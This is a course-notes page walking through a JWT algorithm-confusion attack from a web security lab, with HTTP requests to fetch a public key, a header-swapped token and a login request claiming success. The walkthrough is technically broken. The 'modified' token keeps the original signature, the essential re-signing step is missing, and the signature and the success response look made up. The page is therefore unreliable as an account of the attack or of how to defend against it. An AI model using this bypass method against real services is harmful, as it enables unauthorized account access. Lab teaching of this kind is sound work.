---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## Detailed Walkthrough

### Step 1: Obtain the Server's Public Key

First, you need to obtain the server's public key. This key is typically available at a standard endpoint. For example, the endpoint might be `/public-key`.

```http
GET /public-key HTTP/1.1
Host: example.com
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "public_key": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...\n-----END PUBLIC KEY-----"
}
```

### Step 2: Craft a Modified Token

Now that you have the public key, you can craft a modified token. The goal is to create a token that uses a different signing algorithm than what the server expects.

#### Original Token

Assume the original token is signed with `RS256`:

```plaintext
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIxLCJleHAiOjE1MTYzMTEwMjF9.5rQDvqk4PnJbHhLWVZs6QKXoJyJvZB4vT6j75j7j7j7
```

#### Modified Token

You can modify the token to use `HS256` instead:

```plaintext
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIxLCJleHAiOjE1MTYzMTEwMjF9.5rQDvqk4PnJbHhLWVZs6QKXoJyJvZB4vT6j75j7j7j7
```

### Step 3: Submit the Token

Finally, submit the modified token to the server to gain unauthorized access.

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIxLCJleHAiOjE1MTYzMTEwMjF9.5rQDvqk4PnJbHhLWVZs6QKXoJyJvZB4vT6j75j7j7j7"
}
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "Authentication successful",
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIxLCJleHAiOjE1MTYzMTEwMjF9.5rQDvqk4PnJbHhLWVZs6QKXoJyJvZB4vT6j75j7j7j7"
}
```

---
<!-- nav -->
[[06-Detailed Steps of the Attack|Detailed Steps of the Attack]] | [[Web Security (PortSwigger)/19-JWT Attacks/07-Lab 7 JWT authentication bypass via algorithm confusion/00-Overview|Overview]] | [[08-How to Prevent  Defend Against Algorithm Confusion Attacks|How to Prevent  Defend Against Algorithm Confusion Attacks]]
